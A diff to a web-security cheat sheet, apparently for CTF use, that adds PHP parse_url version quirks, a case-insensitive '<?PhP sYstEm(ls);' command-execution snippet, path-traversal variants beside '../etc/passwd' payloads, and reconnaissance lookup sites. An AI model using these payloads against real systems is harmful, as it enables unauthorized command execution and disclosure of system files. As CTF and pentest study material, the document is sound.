@@ -332,7 +332,15 @@ array(1) {
     - false
 
 - `parse_url('/a.php?id=1:80')`
-    - false
+     - PHP < 7.0.0
+         - `false`
+     - PHP >= 7.0.0
+       ```
+         array(2) { 
+             ["path"]=> string(6) "/a.php" 
+             ["query"]=> string(7) "id=1:80" 
+         }
+       ```
 
 - `parse_url('http://kaibro.tw:87878')`
     - 5.3.X版本以下
@@ -428,6 +436,8 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
 
 ## 其他
 
+- 大小寫不敏感
+    - `<?PhP sYstEm(ls);`
 - `echo (true ? 'a' : false ? 'b' : 'c');`
     - `b`
 - ```echo `whoami`; ```
@@ -1047,6 +1057,9 @@ HQL injection example (pwn2win 2017)
 
 ### Linux / Unix
 
+- `./index.php`
+- `././index.php`
+- `.//index.php`
 - `../../../../../../etc/passwd`
 - `../../../../../../etc/passwd%00`
     - 僅在5.3.0以下可用
@@ -1949,6 +1962,10 @@ state[i] = state[i-3] + state[i-31]`
 - https://dnsdumpster.com/
 
 - https://www.domainiq.com/reverse_whois
+
+- https://www.yougetsignal.com/tools/web-sites-on-web-server/
+
+- https://www.robtex.com/dns-lookup/
 
 - https://phpinfo.me/bing.php
 
